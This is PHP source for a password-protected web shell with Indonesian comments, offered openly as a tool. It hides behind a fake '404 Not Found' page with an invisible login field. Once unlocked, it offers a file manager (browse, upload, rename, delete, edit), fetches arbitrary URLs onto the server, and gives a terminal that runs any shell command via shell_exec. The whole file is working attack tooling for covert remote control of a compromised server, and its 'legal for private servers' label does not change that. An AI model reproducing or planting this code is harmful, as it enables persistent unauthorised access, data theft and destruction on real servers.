<?php
// WebShell by ZammAnon M.Kom - Legal untuk server pribadi

error_reporting(0);
set_time_limit(0);

$pass = "ZammSec";

session_start();
if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass']) && $_POST['pass'] === $pass) {
        $_SESSION['logged_in'] = true;
    } else {
        show_404_login();
    }
}

function show_404_login() {
    echo '<!DOCTYPE html><html><head><title>404 Not Found</title><style>
    body { background: white; color: black; font-family: Arial, sans-serif; margin: 40px; }
    .center {
        position: relative;
        max-width: 600px;
        margin: 0 auto;
    }
    #hidden {
        position: absolute;
        top: 90px;
        left: 0;
        opacity: 0;
        transition: opacity 0.3s;
    }
    input[type=password] {
        width: 430px;
        border: none;
        border-bottom: 1px solid white;
        background: none;
        color: white;
        outline: none;
        font-family: monospace;
        font-size: 16px;
    }
    input[type=password]:focus {
        border: 2px solid black;
        padding: 3px;
    }
    </style></head><body>
    <div class="center">
        <h1>Not Found</h1>
        <p>The requested URL was not found on this server.</p>
        <div id="hidden">
            <form method="POST">
                <input type="password" name="pass" autofocus autocomplete="off">
            </form>
        </div>
    </div>
    <script>
    document.body.addEventListener("click", () => {
        document.getElementById("hidden").style.opacity = 1;
    });
    </script>
    </body></html>';
    exit;
}

// === SHELL FITUR ===

$cwd = getcwd();
$dir = isset($_GET['dir']) ? $_GET['dir'] : $cwd;
chdir($dir);

// Fungsi list
function listFiles($path) {
    $files = scandir($path);
    foreach ($files as $file) {
        if ($file == ".") continue;
        $fullPath = $path . DIRECTORY_SEPARATOR . $file;
        echo "<li><a href='?dir=" . urlencode($path) . "&file=" . urlencode($file) . "'>" . htmlspecialchars($file) . "</a> ";
        echo "[<a href='?dir=" . urlencode($path) . "&rename=" . urlencode($file) . "'>Rename</a>] ";
        echo "[<a href='?dir=" . urlencode($path) . "&delete=" . urlencode($file) . "' onclick='return confirm(\"Hapus?\");'>Delete</a>]";
        echo "</li>";
    }
}

// Upload file
if (isset($_FILES['upload'])) {
    $dest = basename($_FILES['upload']['name']);
    move_uploaded_file($_FILES['upload']['tmp_name'], $dest);
}

// Upload dari URL
if (!empty($_POST['url']) && !empty($_POST['saveas'])) {
    $data = @file_get_contents($_POST['url']);
    if ($data) file_put_contents($_POST['saveas'], $data);
}

// Rename
if (isset($_POST['rename_from']) && isset($_POST['rename_to'])) {
    rename($_POST['rename_from'], $_POST['rename_to']);
}

// Delete
if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (is_file($target)) unlink($target);
    if (is_dir($target)) rmdir($target);
}

// Edit
if (isset($_POST['editfile']) && isset($_POST['content'])) {
    file_put_contents($_POST['editfile'], $_POST['content']);
}

// Terminal
$output = '';
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd . ' 2>&1');
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>WebShell ZammAnon</title>
    <style>
        body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
        input, textarea { background: #222; color: #0f0; border: 1px solid #0f0; }
        input[type=submit], button { background: #0f0; color: #000; font-weight: bold; }
        a { color: #0ff; text-decoration: none; }
        textarea { width: 100%; height: 300px; }
    </style>
</head>
<body>
<h2>File Manager - <?= htmlspecialchars($dir) ?></h2>

<form method="post" enctype="multipart/form-data">
    Upload File: <input type="file" name="upload">
    <input type="submit" value="Upload">
</form>

<form method="post">
    Upload dari URL: <input type="text" name="url" placeholder="https://example.com/file.zip">
    Simpan sebagai: <input type="text" name="saveas" placeholder="file.zip">
    <input type="submit" value="Fetch & Save">
</form>

<h3>Directory Content</h3>
<ul>
    <?php listFiles($dir); ?>
</ul>

<?php if (isset($_GET['rename'])): ?>
    <h3>Rename File</h3>
    <form method="post">
        <input type="hidden" name="rename_from" value="<?= htmlspecialchars($_GET['rename']) ?>">
        Rename <?= htmlspecialchars($_GET['rename']) ?> to:
        <input type="text" name="rename_to" value="<?= htmlspecialchars($_GET['rename']) ?>">
        <input type="submit" value="Rename">
    </form>
<?php endif; ?>

<?php if (isset($_GET['file']) && is_file($_GET['file'])): ?>
    <h3>Edit File: <?= htmlspecialchars($_GET['file']) ?></h3>
    <form method="post">
        <input type="hidden" name="editfile" value="<?= htmlspecialchars($_GET['file']) ?>">
        <textarea name="content"><?= htmlspecialchars(file_get_contents($_GET['file'])) ?></textarea><br>
        <input type="submit" value="Save">
    </form>
<?php endif; ?>

<h3>Terminal</h3>
<form method="post">
    <input type="text" name="cmd" style="width: 100%;" placeholder="ls -la">
    <input type="submit" value="Execute">
</form>
<pre><?= htmlspecialchars($output) ?></pre>

</body>
</html>
